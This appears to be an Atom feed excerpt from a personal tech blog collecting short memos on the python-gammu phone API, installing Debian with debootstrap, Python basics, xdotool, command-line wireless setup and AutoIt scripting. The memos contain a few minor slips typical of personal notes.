<strong>contact = sm.GetNextMemory(Start=True,Type=&#8217;ME&#8217;)</strong> #mobile phone
<strong>contact = sm.GetNextMemory(Location = contact[&#8216;Location&#8217;],Type=&#8217;ME&#8217;)</strong>
..
<span style="color: #0000ff;"> Note: Be carefull to catch gammu.ERR_TIMEOUT instead of EMPTY</span></li>&nbsp;
	<li>TODO lists
Status: <strong>sm.GetToDoStatus()</strong>
First element: <strong>todo = sm.GetNextToDo(Start = True)</strong>
All the others: <strong>sm.GetNextToDo(Location = todo[&#8216;Location&#8217;])</strong>A specific element: <strong>sm.GetTodo(location)</strong></li>&nbsp;
	<li>Calendar
Status: <strong>sm.GetCalendarStatus()</strong>
First element: <strong>cal = sm.GetNextCalendar(Start = True)</strong>
All the others: <strong>sm.GetNextCalendar(cal[&#8216;Location&#8217;])</strong>
A specific element: <strong>sm.GetCalendar(Location = location)</strong></li>&nbsp;
	<li>Others methods</li>
<ul>
	<li><strong>EnterSecurityCode(Type,Code,NewPIN)</strong> #Type(String) PIN, PUK, PIN2, PUK2, Phone. Code and NewPin string</li>
	<li><strong>GetAlarm()</strong> #Return alarm set in phone</li>
	<li><strong>GetBatteryCharge()</strong> #Retrn battery infos</li>
	<li><strong>GetFileSystemStatus()</strong> #Return file system status</li>
	<li><strong>GetFolderListing(&#8220;folder&#8221;,True)</strong> #Get next filename from filesystem</li>
	<li><strong>GetSecurityStatus()</strong></li>
	<li><strong>GetSignalQuality()</strong></li>
</ul>&nbsp;
	<li>Interesting variables:
MAC_Prefixes = {
&#8216;Sony-Ericsson&#8217; : [&#8216;00:01:EC&#8217;,&#8217;00:0A:D9&#8217;,&#8217;00:0E:07&#8217;,&#8217;00:0F:DE&#8217;,&#8217;00:12:EE&#8217;,&#8217;00:15:E0&#8217;,
&#8216;00:16:20&#8217;,&#8217;00:16:B8&#8217;,&#8217;00:18:13&#8217;,&#8217;00:19:63&#8217;,&#8217;00:1A:75&#8217;,&#8217;00:1B:59&#8217;,
&#8216;00:1C:A4&#8217;,&#8217;00:1D:28&#8217;,&#8217;00:1E:45&#8217;,&#8217;00:80:37&#8217;,
],
&#8216;Nokia&#8217; : [&#8216;00:02:EE&#8217;,&#8217;00:0B:E1&#8217;,&#8217;00:0E:ED&#8217;,&#8217;00:0F:BB&#8217;,&#8217;00:10:B3&#8217;,&#8217;00:11:9F&#8217;,
&#8216;00:12:62&#8217;,&#8217;00:13:70&#8217;,&#8217;00:13:FD&#8217;,&#8217;00:14:A7&#8217;,&#8217;00:15:2A&#8217;,&#8217;00:15:A0&#8217;,
&#8216;00:15:DE&#8217;,&#8217;00:16:4E&#8217;,&#8217;00:16:BC&#8217;,&#8217;00:17:4B&#8217;,&#8217;00:17:B0&#8217;,&#8217;00:18:0F&#8217;,
&#8216;00:18:42&#8217;,&#8217;00:18:8D&#8217;,&#8217;00:18:C5&#8217;,&#8217;00:19:2D&#8217;,&#8217;00:19:4F&#8217;,&#8217;00:19:79&#8217;,
&#8216;00:19:B7&#8217;,&#8217;00:1A:16&#8217;,&#8217;00:1A:89&#8217;,&#8217;00:1A:DC&#8217;,&#8217;00:1B:33&#8217;,&#8217;00:1B:AF&#8217;,
&#8216;00:1B:EE&#8217;,&#8217;00:1C:35&#8217;,&#8217;00:1C:9A&#8217;,&#8217;00:1C:D4&#8217;,&#8217;00:1C:D6&#8217;,&#8217;00:1D:3B&#8217;,
&#8216;00:1D:6E&#8217;,&#8217;00:1D:98&#8217;,&#8217;00:1D:E9&#8217;,&#8217;00:1D:FD&#8217;,&#8217;00:1E:3A&#8217;,&#8217;00:1E:3B&#8217;,
&#8216;00:1E:A3&#8217;,&#8217;00:1E:A4&#8217;,&#8217;00:40:43&#8217;,&#8217;00:A0:8E&#8217;,
&#8216;00:E0:03&#8217;,
],
&#8216;Siemens&#8217; : [&#8216;00:01:E3&#8217;,&#8217;00:05:19&#8217;,&#8217;00:0B:23&#8217;,&#8217;00:0B:A3&#8217;,&#8217;00:0D:41&#8217;,&#8217;00:0E:8C&#8217;,
&#8216;00:0F:BB&#8217;,&#8217;00:11:06&#8217;,&#8217;00:11:33&#8217;,&#8217;00:13:A3&#8217;,&#8217;00:18:D1&#8217;,&#8217;00:19:28&#8217;,&#8217;00:19:99&#8217;,
&#8216;00:1A:D0&#8217;,&#8217;00:1A:E8&#8217;,&#8217;00:1B:1B&#8217;,&#8217;00:1C:06&#8217;,&#8217;00:30:05&#8217;,&#8217;00:50:07&#8217;,
&#8216;00:90:40&#8217;,&#8217;00:C0:E4&#8217;,&#8217;08:00:06&#8217;,
],
&#8216;Samsung&#8217; : [&#8216;00:00:F0&#8217;,&#8217;00:02:78&#8217;,&#8217;00:09:18&#8217;,&#8217;00:0D:AE&#8217;,&#8217;00:0D:E5&#8217;,&#8217;00:0F:73&#8217;,
&#8216;00:12:47&#8217;,&#8217;00:12:FB&#8217;,&#8217;00:13:77&#8217;,&#8217;00:15:99&#8217;,&#8217;00:15:B9&#8217;,&#8217;00:16:32&#8217;,
&#8216;00:16:6B&#8217;,&#8217;00:16:6C&#8217;,&#8217;00:16:DB&#8217;,&#8217;00:17:C9&#8217;,&#8217;00:17:D5&#8217;,&#8217;00:18:AF&#8217;,
&#8216;00:1A:8A&#8217;,&#8217;00:1B:98&#8217;,&#8217;00:1C:43&#8217;,&#8217;00:1D:25&#8217;,&#8217;00:1D:F6&#8217;,&#8217;00:1E:7D&#8217;,
&#8216;00:E0:64&#8217;,
],
&#8216;LG&#8217; : [&#8216;00:05:C9&#8217;,&#8217;00:0B:29&#8217;,&#8217;00:12:56&#8217;,&#8217;00:14:80&#8217;,&#8217;00:19:A1&#8217;,&#8217;00:1C:62&#8217;,
&#8216;00:1E:75&#8217;,&#8217;00:1E:B2&#8217;,&#8217;00:50:CE&#8217;,&#8217;00:E0:91&#8217;,
],
&#8216;BenQ&#8217; : [&#8216;00:03:9D&#8217;,&#8217;00:17:CA&#8217;,
],
&#8216;Motorola&#8217; : [&#8216;00:01:AF&#8217;,&#8217;00:04:56&#8217;,&#8217;00:04:BD&#8217;,&#8217;00:08:0E&#8217;,&#8217;00:0A:28&#8217;,&#8217;00:0B:06&#8217;,
&#8216;00:0C:E5&#8217;,&#8217;00:0E:5C&#8217;,&#8217;00:0E:C7&#8217;,&#8217;00:0F:9F&#8217;,&#8217;00:11:1A&#8217;,&#8217;00:11:80&#8217;,
&#8216;00:11:AE&#8217;,&#8217;00:12:25&#8217;,&#8217;00:12:8A&#8217;,&#8217;00:12:C9&#8217;,&#8217;00:13:71&#8217;,&#8217;00:14:04&#8217;,
&#8216;00:14:9A&#8217;,&#8217;00:14:E8&#8217;,&#8217;00:15:2F&#8217;,&#8217;00:15:9A&#8217;,&#8217;00:15:A8&#8217;,&#8217;00:16:26&#8217;,
&#8216;00:16:75&#8217;,&#8217;00:16:B5&#8217;,&#8217;00:17:00&#8217;,&#8217;00:17:84&#8217;,&#8217;00:17:E2&#8217;,&#8217;00:17:EE&#8217;,
&#8216;00:18:A4&#8217;,&#8217;00:18:C0&#8217;,&#8217;00:19:2C&#8217;,&#8217;00:19:5E&#8217;,&#8217;00:19:A6&#8217;,&#8217;00:19:C0&#8217;,
&#8216;00:1A:1B&#8217;,&#8217;00:1A:66&#8217;,&#8217;00:1A:77&#8217;,&#8217;00:1A:AD&#8217;,&#8217;00:1A:DB&#8217;,&#8217;00:1A:DE&#8217;,
&#8216;00:1B:52&#8217;,&#8217;00:1B:DD&#8217;,&#8217;00:1C:11&#8217;,&#8217;00:1C:12&#8217;,&#8217;00:1C:C1&#8217;,&#8217;00:1C:FB&#8217;,
&#8216;00:1D:6B&#8217;,&#8217;00:1D:BE&#8217;,&#8217;00:1E:46&#8217;,&#8217;00:1E:5A&#8217;,&#8217;00:1E:8D&#8217;,&#8217;00:20:40&#8217;,
&#8216;00:20:75&#8217;,&#8217;00:A0:BF&#8217;,&#8217;00:C0:F9&#8217;,&#8217;00:E0:0C&#8217;,
],
&#8216;Alcatel&#8217; : [&#8216;00:07:72&#8217;,&#8217;00:08:9A&#8217;,&#8217;00:0E:86&#8217;,&#8217;00:0F:62&#8217;,&#8217;00:11:3F&#8217;,&#8217;00:11:8B&#8217;,
&#8216;00:15:3F&#8217;,&#8217;00:16:4D&#8217;,&#8217;00:17:CC&#8217;,&#8217;00:19:8F&#8217;,&#8217;00:1A:F0&#8217;,&#8217;00:1C:8E&#8217;,
&#8216;00:1D:4C&#8217;,&#8217;00:20:32&#8217;,&#8217;00:20:60&#8217;,&#8217;00:20:DA&#8217;,&#8217;00:80:21&#8217;,&#8217;00:80:39&#8217;,
&#8216;00:80:9F&#8217;,&#8217;00:A0:81&#8217;,&#8217;00:C0:BE&#8217;,&#8217;00:D0:95&#8217;,&#8217;00:D0:F6&#8217;,&#8217;00:E0:B1&#8217;,
&#8216;00:E0:DA&#8217;,
],
}</li>
</ul>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Use Debootstrap]]></title>
    <link href="http://www.robindavid.fr/blog/2011/08/10/use-debootstrap/"/>
    <updated>2011-08-10T00:00:00+00:00</updated>
    <id>http://www.robindavid.fr/blog/2011/08/10/use-debootstrap</id>
    <content type="html"><![CDATA[&nbsp;
<ul>
	<li><strong>parted</strong>
Create partition in primary/extented in mbr/gpt&#8230;</li>
&nbsp;
	<li> <strong>mkfs.ext4 -L MyPartition /dev/sda1</strong>
Create the file system on the main system partition</li>
&nbsp;
	<li> <strong>mkdir /media/debian</strong>
Create a temp directory in which the partition will be mounted and the system installed</li>
&nbsp;
	<li> <strong>mount /dev/sda1 /media/debian</strong>
Mount the partition in the created directory</li>
&nbsp;
	<li> <strong>debootstrap wheezy /media/debian http://ftp.fr.debian.org/debian</strong>
Make a deboostrap of the wheezy version of debian(could be changed as you wish), from the nearest repository.</li>
&nbsp;
	<li> <strong>mount -o bind /dev /media/debian/dev</strong>
Bind dev</li>
&nbsp;
	<li> <strong>mount -o bind /dev/pts /media/debian/dev/pts</strong>
Bind /dev/pts</li>
&nbsp;
	<li> <strong>mount sysfs -t sysfs /media/debian/sys</strong>
mount sysfs</li>
&nbsp;
	<li> <strong>mount proc -t proc /media/debian/proc</strong>
Bind proc</li>
&nbsp;
	<li> <strong>touch /media/debian/etc/debian_chroot</strong>
Allow to show on the prompt if chrooted or not (avoid misuse)
<span style="color: #339966;">Ex: echo &#8220;mychroot&#8221; </span></li>
&nbsp;
	<li> <strong>chroot /media/debian</strong>
Now chrooted !</li>
&nbsp;
	<li> <strong>aptitude update</strong>
<span style="color: #0000ff;">Note: All the following operation uses host kernel </span></li>
&nbsp;
	<li> <strong>aptitude install locales console-data vim bash-completion dialog</strong>
locales language
console-data (keyboard)</li>
&nbsp;
	<li> <strong>dpkg-reconfigure locales</strong>
setup language</li>
&nbsp;
	<li> #<strong>aptitude install eatmydata</strong>
To improve performance of download and install packets by hooking sync kernel calls</li>
&nbsp;
	<li> <strong>vim /etc/bash.bashrc</strong>
You should uncomment completion stuff</li>
&nbsp;
	<li> <strong>source /etc/bash_completion</strong>
Apply changes</li>
&nbsp;
	<li> <strong>aptitude install linux-image-xxxx-amd64 grub</strong>
Put new kernel and setup grub entirely
For hard drive choose sda not sda1, and do the following command if the install don&#8217;t do it itself.
grub-install /dev/sda
update-grub
update-initramfs</li>
	<li></li>
&nbsp;
	<li> <strong>aptitude install gpm</strong>
to get the mouse in console, to easily do copy past
<span style="color: #0000ff;">Note: Ignore errors if it happens</span></li>
&nbsp;
	<li> <strong>vim /etc/hostname</strong>
if needed/wanted</li>
&nbsp;
	<li> <strong>vim /etc/network/interfaces</strong>
Put in:
auto lo
iface lo inet loopback
<span style="color: #0000ff;">Note: Otherwise lots of applications will crash because dbus and others applications use local network and if he doesn&#8217;t find it in etc/network the system will become unstable. </span></li>
&nbsp;
	<li> <strong>vim /etc/fstab</strong>
Adapt depending of needs
UUID=xxxx	/	btrfs	defaults&#8230;	0	0
root 1, home 2, tmp 0
<span style="color: #0000ff;">Note you can use blkid /dev/sda1 to get uuid of partitions.</span></li>
&nbsp;
	<li> <strong>passwd</strong>
Otherwise at the reboot a passwd will be asked without being set before.</li>
&nbsp;
	<li> <strong>#Bonus tasksel</strong>
<span style="color: #339966;">ex: tasksel install standard</span>
This install standard utilities like less, top ..</li>
&nbsp;
	<li> <strong>exit</strong>
Back on host !</li>
&nbsp;
	<li>Umount everything or directly reboot</li>
</ul>
Enjoy you&#8217;re new system :)
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Python Memo]]></title>
    <link href="http://www.robindavid.fr/blog/2011/06/13/python-memo/"/>
    <updated>2011-06-13T00:00:00+00:00</updated>
    <id>http://www.robindavid.fr/blog/2011/06/13/python-memo</id>
    <content type="html"><![CDATA[<br/>
<ul>
	<li><strong>compile()</strong>
	Can compile on the fly new python code with the given string into python instructions
<br/>
<code>
&gt;&gt;&gt; eval_code = compile('100 + 200', '', 'eval')<br/>
&gt;&gt;&gt; eval(eval_code)<br/>
300
</code><br/>
<span style="color: #0000ff;">Note:It can also compile all file etc.</span></li>
<br/>
	<li><strong>sys.exitfunc()</strong>
Do nothing by default, but can be overwritten and is called when sys.exit() is called<br/>
<code>import sys<br/>
def my_exit_func(old_exit = prev_exit_func):<br/>
&nbsp;&nbsp;&nbsp;&nbsp;# perform cleanup<br/>
sys.exitfunc = my_exit_func #Override old function with our.
</code>
</li>

<br/>
	<li><strong>urlparse</strong>
	with URL component: <em>scheme://net_loc/path;params?query#frag</em><br/>
<code>
import urlparse<br/>
urlparse("http://www.google.fr/test/index.html?val=1&amp;test=2#foo")<br/>
ParseResult(scheme='http', netloc='www.google.fr', path='/test/index.html', params='', query='val=1&amp;test=2', fragment='foo')<br/>
#note:  urlunparse do exactly the reverse and take a tuple of 6
</code>
<br/>
<li><strong>urlencode</strong><br/>
<code>
import urllib<br/>
aDict = { 'name': 'Georgina Garcia', 'hmdir': '~ggarcia' }<br/>
urllib.urlencode(aDict)<br/>
'name=Georgina+Garcia&amp;hmdir=%7eggarcia'<br/>
</code>
</li>

<br/>
<li><strong>Call C functions Windows</strong><br/>
<code>
from ctypes import cdll<br/>
msvcrt = cdll.msvcrt #Printf is in the msvcrt DLL<br/>
message = "Hello World!\n"<br/>
msvcrt.printf("Testing: %s", message)<br/>
</code>
</li>
<br/>

<li><strong>Call C functions Linux</strong><br/>
<code>
from ctypes import *<br/>
libc = CDLL("libc.so.6")<br/>
message_string = "Hello world!\n"<br/>
libc.printf("Testing: %s", message_string)<br/>
</code>
</li>

</ul>
<br/><br/>

<h3> Other memo </h3>

<ul>
	<li><p>str = &#8220;Python&#8221;<br/>
	<strong>&#8216;ton&#8217; in str</strong> Return false could be used with a if without regex<br/>
	<strong>&#8216;thon&#8217; in str</strong> Return true</p></li>

<br/>
<li><p><strong>[i for i in range(10)]</strong> # Return [0, 1, 2, 3, 4, 5, 6, 7, 8, 9]<br/>
<strong>[i for i in range(10) if i % 2 == 0] </strong># Return [0, 2, 4, 6, 8]<br/>
<strong>[i*2 for i in range(10)]</strong> # Return [0, 2, 4, 6, 8, 10, 12, 14, 16, 18]<br/>
So it is possible in one line to pass through all array element and do something on them (but not printing)</p></li>
<br/>
	<li>Ternary operator: <strong>C ? T : F</strong> means: if T if C else F</li>
<br/>
<li>max = x if x &gt; y else Y</li>
<br/>
<li>MD5 usage:<br/>
<code>
from hashlib import md5<br/>
hash = md5("Hello world")<br/>
print hash.digest().encode('hex')<br/>
</code>
</li>

<br/>

<li><strong>sys.stdout.write(&#8220;Hello World\n&#8221;)</strong> alternate way to print Hello world writing directly stdout</li>

<br/>

	<li><strong>sys.stdin.readline()</strong> read directly a line on the stdin</li>
<br/>

	<li><strong>print(text, end=&#8221; &#8220;) </strong> in python 3.x define the end character instead of jump line it will add a space</li>
<br/>

	<li>Anonymous function:<br/> def add-one(x): <br/>&nbsp;&nbsp;&nbsp;&nbsp;return x + 1<br/> Could be substitued by: <br/><strong>add_one = lambda x: x + 1</strong></li><br/>
	<li><span style="text-decoration: underline;">Procedural</span>: <strong>my_str = string.split(my_str)</strong><span style="color: #0000ff;"> #Note: Need to import string</span></li>
	<li><span style="text-decoration: underline;">Object Oriented</span>: <strong>my_str = my_str.split()</strong> <span style="color: #0000ff;">#Note: Could create a string on the fly if needed with: &#8221;.split()</span></li><br/>
	<li><strong>round()</strong> Round the float to the given precision ex: <br/><span style="color: #008000;">&#8217;%.2f&#8217; % round(1.185, 2) # Return 1.19</span></li><br/>
	<li><strong>isinstance()</strong></li>
	<li><strong>issubclass()</strong> <span style="color: #0000ff;">#Note: without self it is a static function attribute</span></li><br/>
	<li><strong>cmp()</strong> Compare two object, return 0 if equal</li>
	<li><strong>str()</strong> Return a printable format of an object</li><br/>
	<li>String formating <br/><strong>&#8220;Name: %s, age: %d&#8221; % (&#8216;Dave&#8217;,23)</strong> Specify the type expected for variable <strong><br/>&#8220;Name: {0}, age: {1}&#8221;.format(&#8216;Dave&#8217;,23)</strong> Here format determine the type of the variableso it works in all cases.</li><br/>
	<li><strong>&#8220;My string&#8221;.replace(&#8220;i&#8221;,&#8221;j&#8221;)</strong> Easy way to replace elements in a string</li>
	<li><strong>&#8220;My string&#8221;.find(&#8220;my&#8221;)</strong> -1 not found, 0 equal, 2 found <span style="color: #0000ff;">Note: This two do not support regular expression</span></li><br/>
	<li><strong>&#8220;My string&#8221;.center(25)</strong> Return the string with 25 spaces before and after</li><br/>
	<li>Miscellanous string transformations<br/> test = &#8220;python is cool&#8221; <br/><strong>test.title()</strong> Return &#8220;Python Is Cool&#8221; <br/><strong>test.swapcase()</strong> Return &#8220;pYTHON iS cOOL&#8221; <br/><strong>test.isalpha() </strong>Return True if ALL character are alphabetics (.!, excluded)</li><br/>
	<li>test = [2,1,5,3] <strong>test.sort()</strong> <br/>Return [1, 2, 3, 5]</li><br/>
	<li><strong>y = copy.deepcopy(x)</strong> <br/>Copy object into x and not only just references, because otherwise change y modify x also. <span style="color: #0000ff;"><br/>Note: Originally made for compute efficiency reasons.</span></li><br/>
	<li><strong>ord(&#8216;A&#8217;)</strong> Return the decimal value of &#8216;A&#8217; (65)</li>
	<br/>

	<li><strong>sum([2,3,4])</strong>
Return the sum of the list</li>
<br/>
	<li><strong>int(&#8220;4&#8221;)</strong>
This transform the string 4 into integer 4
<span style="color: #0000ff;">Note: It is the same for float(), and complex()</span></li>
<br/>
	<li><strong>del(self)</strong>
Kill an object itself</li>
<br/>
	<li><strong>def my_func(a=0,b=0)</strong>
Could specify the name of a variable in a function call ex:
my_fun(b=0) <span style="color: #0000ff;"># if we had put only 0 it would be the &#8220;a&#8221; variable</span></li>
<br/>
	<li><strong>global var</strong> #define a global variables</li>
	<li><strong>local var </strong> #define a variable in the block</li>
<br/>
	<li><strong>var1 = var2 = &#8220;hello&#8221; </strong>#Assign the same value for two differents variables</li>
	<li><strong>var1,var2 = &#8220;Hello&#8221;,1 </strong> #Assign two variables on one line</li>
<br/>
	<li><span style="color: #0000ff;">Note : raw_input doesn&#8217;t exist anymore in python 3.2 and input accept string in 3.2</span></li>
<br/>
	<li> Other types:
<strong>- complex</strong>
<strong>- bool</strong></li>
<br/>
	<li><strong>*</strong> is a tuple</li>
	<li><strong>**</strong> is a dictionnary
#used for varargs&#8217;s declaration</li>
<br/>
	<li>Dictionnary
<strong>d.get{&#8216;key1&#8217;,&#8221;N/A&#8221;} </strong> # Return the key if it exists the 2nd argument if not.
<strong>c = set(a)</strong> # Create a set with &#8220;a&#8221; a list</li>
<br/>
	<li>IN PYTHON 3 a string is a byte array with an encoding. So a string is excpected you should use:
<strong>bytes(&#8216;my message\n&#8217;,&#8217;utf-8&#8217;)</strong>
#Or Send directly the string but could fail</li>
</ul>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[xdotool + xwininfo Memo]]></title>
    <link href="http://www.robindavid.fr/blog/2011/04/24/xdotool-xwininfo-memo/"/>
    <updated>2011-04-24T00:00:00+00:00</updated>
    <id>http://www.robindavid.fr/blog/2011/04/24/xdotool-xwininfo-memo</id>
    <content type="html"><![CDATA[First of all, I know that the text written below could be found in the xdotool man, but this summarize it and allow a quick acess to few examples and the more important arguments.

I discovered it quite randomly by looking for a way to access keyboard keys in python. I finally analysed what we could do with xdotool it is really amazing. xdotool is a software which allow manipulate keyboard, mouse and windows of the X server. It can by this way completely replace the user in front of his computer, and allow automate tasks that cannot be done in command line. It is the Unix equivalent for AutoIt in Windows. This increase considerably the power of bash scripts and consolidate my idea that we can do almost everything in bash. Below the more interesting commands:

&nbsp;
<ul>
	<li><strong>xdotool getactivewindow</strong>
Return the active window</li>
<br/>
	<li><strong>xwininfo -id 2784333</strong>
Give information about the given window, like size, coordinate and graphical aspect</li>
<br/>
	<li> <strong>xdotool getmouselocation &#8211;shell</strong>
Return the mouse location, with X, Y and the Display Number(could have multiple X server)
&#8211;sheel format the returned string to be &#8220;eval&#8221; if needed.

The script below show in live the mouse position.
<pre>
<span style="color: #009900;">#!/bin/bash</span>

<span style="color: #0000ff;">while</span> ((<span style="color: #ff0000;">1</span>)) ; <span style="color: #0000ff;">do</span>
        eval $(xdotool getmouselocation --shell)
        echo -e <span style="color: #888888;">"X=$X\tY=$Y\r\c"</span>
<span style="color: #0000ff;">done</span></pre></li>
<br/>
	<li>Send Keys:
<strong>xdotool key F2</strong>
It exist also keydown, and keyup which I think could be understood as keypressed and key released(not tested)</li>
<br/>
	<li>Type text:
<strong>xdotool type &#8216;Hello world!&#8217;</strong>Type the given text as if it were the user.</li>
<br/>
	<li>Mouse move:
<strong>xdotool mousemove 0 0</strong>
Move the mouse cursor to the position x=0, y=0</li>
<br/>
	<li><strong>xdotool mousemove_relative 10 10</strong>
Same as mousemove but relatively to the current position of the mouse</li>
<br/>
	<li>Click:
<strong>xdotool click 1</strong>
<span style="color: #0000ff;">Note 1:Left, 2:Middle, 3:Right, 4:wheel up, 5:wheel down</span>
There is also mouseup and mousedown (which is the same than keys of keyboard)</li>
<br/>
	<li>Search
<strong>xdotool search &#8211;onlyvisible &#8211;name &#8220;^Opera$&#8221;</strong>
Research in window name with the regex pattern given
The other interesting args are:
&#8211;pid PID #specify a pid(more accurate than string search and unique)</li>
<br/>
	<li><strong>getwindowfocus</strong> Return the window focused</li>
<br/>
	<li><strong>xdpyinfo | awk &#8216;/dimensions:/ {split($2,nf,&#8221;x&#8221;);print &#8220;width=&#8221;nf[1];print &#8220;height=&#8221;nf[2];exit }&#8217;</strong>
This have nothing to see with xdotool but return screen resolution in a formated way to be eval in bash</li>
<br/>
	<li><strong>xdotool windowsize 3447722 300 300</strong> Change the size of the given window</li>
<br/>
	<li><strong>xdotool windowmove 34734345 200 200</strong>
Move the given window to the given position</li>
<br/>
	<li><strong>xdotool windowmap 34734345 200 200</strong>
Put the given window on the foreground(normally)
The reverse is &#8220;windowunmap&#8221; which hide the given window</li>
</ul>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Fix Wireless Connection in CLI]]></title>
    <link href="http://www.robindavid.fr/blog/2010/11/29/fix-wireless-in-cli/"/>
    <updated>2010-11-29T00:00:00+00:00</updated>
    <id>http://www.robindavid.fr/blog/2010/11/29/fix-wireless-in-cli</id>
    <content type="html"><![CDATA[<h2>WEP connection</h2>
We suppose in this example that our wireless interface is wlan0.
<br/>
<strong>iwconfig wlan0 mode managed key [WEP key]<br/>
iwconfig wlan0 essid &#8220;[ESSID]&#8221;</strong>
<br/>
If you use DHCP do:<br/>
<strong>dhclient wlan0</strong><br/>
else do:<br/>
<strong>ifconfig wlan0 [IP address] netmask [subnetmask]<br/>
route add default gw [IP of default gateway]</strong><br/>
<br/>
<span style="color: #0000ff;"> (Configure your default gateway; usually the IP of the Access Point)</span><br/><br/>

<strong>echo nameserver [IP address of DNS server]  &gt;&gt;  /etc/resolve.conf</strong><br/>

<span style="color: #0000ff;"> (Configure your DNS server)</span>
<br/><br/>
<h2>WPA Connection</h2>
The WPA is harder than wep, because you have to define the WPA type (PSK&#8230;).

To make it work you need first to install two packages: <strong>wireless-tools wpasupplicant.</strong><br/><br/>

Edit <strong>/etc/network/interfaces</strong> and put:
<p style="padding-left: 30px;">If you are in DHCP:</p>
<p style="padding-left: 60px;"><strong>auto wlan0</strong></p>
<p style="padding-left: 60px;"><strong> </strong><strong>iface wlan0 inet dhcp</strong><strong> </strong></p>
<p style="padding-left: 90px;"><strong>wpa-conf /etc/wpa_supplicant/wpa_supplicant.conf</strong></p>
<p style="padding-left: 30px;">If you are in static:</p>
<p style="padding-left: 60px;"><strong>auto wlan0</strong><br/>
<strong>iface eth0 inet static</strong><br/>
<strong style="padding-left: 30px;">address 192.168.0.100v</strong><br/>
<strong style="padding-left: 30px;" >network 192.168.0.0</strong><br/>
<strong style="padding-left: 30px;" >netmask 255.255.255.0</strong><br/>
<strong style="padding-left: 30px;" >broadcast 192.168.0.255</strong><br/>
<span style="color: #0000ff;">#Of course depending of your network your values can be differents</span></p><br/>
Now edit <strong>/etc/wpa_supplicant/wpa_supplicant.conf</strong> and put:<br/>

<strong>ctrl_interface=/var/run/wpa_supplicant</strong><strong><br/>
</strong><strong>eapol_version=1</strong><strong><br/>
</strong><strong>ap_scan=1</strong><strong><br/>
</strong><strong>fast_reauth=1</strong><strong><br/>
</strong>
<br/>

<strong>network={</strong><strong><br/>

</strong><strong> ssid=nameofNetwork</strong><strong><br/>
</strong><strong> scan_ssid=1</strong><strong><br/>
</strong><strong> proto=WPA</strong><strong><br/>
</strong><strong> key_mgmt=WPA-PSK</strong><strong><br/>
</strong><strong> psk=passwordOfNetwork</strong><strong><br/>
</strong><strong> priority=5</strong><strong><br/>
</strong><strong>} </strong><br/>

<span style="color: #0000ff;">#You should change values if the network is in WPA2 for example.. </span>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[AutoIt Memo]]></title>
    <link href="http://www.robindavid.fr/blog/2010/11/20/autoit-memo/"/>
    <updated>2010-11-20T00:00:00+00:00</updated>
    <id>http://www.robindavid.fr/blog/2010/11/20/autoit-memo</id>
    <content type="html"><![CDATA[Below basics and examples about AutoIt, which is a pretty good script language :).<br/>
<ul>
	<li><strong>Basic message box:</strong></li>
</ul>
<p style="padding-left: 30px;">MsgBox(0, &#8220;Tuto&#8221;, &#8220;Hello World!&#8221;)</p>
<br/>
<ul>
	<li><strong>Variable: </strong>
<ul>
	<li>Global $var=&#8221;hello&#8221;<span style="color: #0000ff;"> #Define a global var(exist in include too), There is also Dim(global in the current file), and local which is local to function or block</span></li>
	<li>my_array[5] = [1,2,3,4,5] <span style="color: #0000ff;"># Define an array</span></li>
</ul>
</li><br/>
	<li><strong>Few interesting global vars:</strong>
<ul>
	<li>@ScriptDir: path to the script <span style="color: #0000ff;">#The most used</span></li>
	<li>@CRLF: equivalent to \n</li>
	<li>@TempDir, @MyDocumentsDir, @SystemDir, @ProgramFilesDir</li>
</ul>
</li><br/>
	<li><strong>Operators: </strong>
<ul>
	<li>They are classicals except (== is =) and (!= is &lt;&gt;)</li>
</ul>
</li>
</ul><br/>
<ul>
	<li>If $var = 1 Then <span style="color: #0000ff;"># Could use ()</span>
ElseIf $var &gt;= 2 Then
EndIf</li>
</ul><br/>
<ul>
	<li>Select
Case ($var &lt;= 0)
<span style="color: #0000ff;"> #etc</span>
EndSelect</li><br/>
	<li>Switch $var
Case 1 To 10
<span style="color: #0000ff;"> #etc&#8230;</span>
EndSwitch</li>
</ul><br/>
<ul>
	<li><strong>Input box</strong></li>
</ul>
<p style="padding-left: 30px;">$input = InputBox(&#8220;Tuto&#8221;, &#8220;Entrer password :&#8221;)
If @error
<span style="color: #0000ff;"># If the user click on cancel..</span></p>
<br/>
<ul>
	<li>For $i = 0 To 10
msgbox(0,&#8221;Tutoriel&#8221;, $i)
Next
<span style="color: #0000ff;">Note: By default the step is 1, but you do for instance For $i =0 To 10 Step 2 or -1</span></li><br/>
	<li>While ( $quit &lt;&gt; 1 ) # Could be While 1
<span style="color: #0000ff;"># continue</span>
WEnd</li><br/>
	<li><strong>Sleep(1000)</strong></li>
</ul>
<p style="padding-left: 30px;">Will sleep 1 second</p>
<br/>
<ul>
	<li>Do
<span style="color: #0000ff;">#actions</span>
Until ($my_var1 &lt;&gt; 0)</li><br/>
	<li>Func my_function ($param1, $param2 = &#8220;&#8221;)
<span style="color: #0000ff;"> # code</span>
Return 1
EndFunc
Declare a function with  two arguments
<span style="color: #0000ff;">Note: param 2 is optionnal and take the default value instead</span></li><br/>
	<li><strong>Func my_function(ByRef $my_var)</strong>
Reference a variable, so it&#8217;s the given variable which will be modified and not the &#8220;copy&#8221;</li><br/>
	<li><strong>#include &#8220;path/myscript.au3&#8221;
#include &lt;String.au3&gt;</strong>
Use &lt;&gt; for the same reason as in C (will take libraries in include folder of AutoIt</li><br/>
	<li><strong>Get mouse position</strong></li>
</ul>
<p style="padding-left: 30px;">$pos = MouseGetPos()</p>
<p style="padding-left: 30px;">$x = $pos[0]</p>
<p style="padding-left: 30px;">$y = $pos[1]</p>
<br/>
<ul>
	<li><span style="color: #333333;"><strong>$Menu_File = GuiCtrlCreateMenu(&#8220;&amp;File&#8221;)</strong></span></li>
</ul>
<p style="padding-left: 30px;">Create new Menu and to create element in this menu do:</p>
<p style="padding-left: 30px;">$Menu_File_Exit = GUICtrlCreateMenuItem(&#8220;&amp;Exit&#8221;, $Menu_File)</p>
<p style="padding-left: 30px;">We give the parent in argument</p>
<br/>
<ul>
	<li><strong>If _IsPressed(25)</strong></li>
</ul>
<p style="padding-left: 30px;">Test if space bar is pressed</p>
<p style="padding-left: 30px;"><span style="color: #0000ff;">Note: Need to include &lt;Misc.au3&gt;</span></p>
<br/>
<ul>
